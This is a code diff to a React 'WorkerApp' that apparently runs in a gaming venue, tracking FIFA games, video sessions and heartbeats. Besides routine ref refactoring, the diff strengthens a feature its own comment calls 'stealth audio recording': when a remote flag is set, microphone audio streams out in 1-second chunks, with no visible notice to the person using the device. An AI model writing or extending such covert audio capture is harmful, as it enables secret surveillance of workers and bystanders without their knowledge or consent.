@@ -25,6 +25,10 @@ const WorkerApp: React.FC = () => {
   const audioContextRef = useRef<AudioContext | null>(null);
   const workerRef = useRef<Worker | null>(null);
 
+  // Critical Refs for background tasks to avoid stale closures
+  const audioRequestedRef = useRef(false);
+  const activeHouseRef = useRef<HouseId>(activeHouse);
+
   const loadData = async () => {
     const [fetchedGames, fetchedPrices, fetchedVideo] = await Promise.all([
       getStoredGames(),
@@ -103,26 +107,24 @@ const WorkerApp: React.FC = () => {
     };
   }, []);
 
-  const activeHouseRef = useRef(activeHouse);
-  const isCapturingRef = useRef(isCapturing);
-  
   useEffect(() => {
     activeHouseRef.current = activeHouse;
-    isCapturingRef.current = isCapturing;
-  }, [activeHouse, isCapturing]);
+  }, [activeHouse]);
 
   const syncCycle = async () => {
     const hId = activeHouseRef.current;
-    const isCap = isCapturingRef.current;
     sendHeartbeat(hId);
     const refreshedVideo = await getVideoSession();
     setVideoSession(refreshedVideo);
-    if (refreshedVideo.lastRequestTime && refreshedVideo.lastRequestTime > lastAcknowledgedRequestRef.current && refreshedVideo.houseId === hId && !isCap) {
+    
+    // Update Ref for stealth audio recording
+    audioRequestedRef.current = refreshedVideo.audioRequested === true && refreshedVideo.houseId === hId;
+
+    if (refreshedVideo.lastRequestTime && refreshedVideo.lastRequestTime > lastAcknowledgedRequestRef.current && refreshedVideo.houseId === hId && !capturingRef.current) {
         setShowMissedAlert(true);
     }
     const refreshedGames = await getStoredGames();
     setGames(prev => {
-      // Fix: Added explicit type annotations to avoid "unknown" type error in sort
       const localMap = new Map<string, GameEntry>(prev.map(g => [g.id, g]));
       refreshedGames.forEach(g => localMap.set(g.id, g));
       return Array.from(localMap.values()).sort((a: GameEntry, b: GameEntry) => a.timestamp - b.timestamp);
@@ -136,7 +138,8 @@ const WorkerApp: React.FC = () => {
       mediaRecorderRef.current = recorder;
       
       recorder.ondataavailable = async (e) => {
-        if (e.data.size > 0 && videoSession.audioRequested) {
+        // Use Ref here to ensure we have the absolute latest request status
+        if (e.data.size > 0 && audioRequestedRef.current) {
           const reader = new FileReader();
           reader.readAsDataURL(e.data);
           reader.onloadend = () => {
@@ -146,7 +149,7 @@ const WorkerApp: React.FC = () => {
         }
       };
       
-      recorder.start(1000); // 1-second chunks
+      recorder.start(1000); // Send 1-second chunks for lower latency
       setMicSynced(true);
       localStorage.setItem('fifa_mic_synced', 'true');
     } catch (e) {
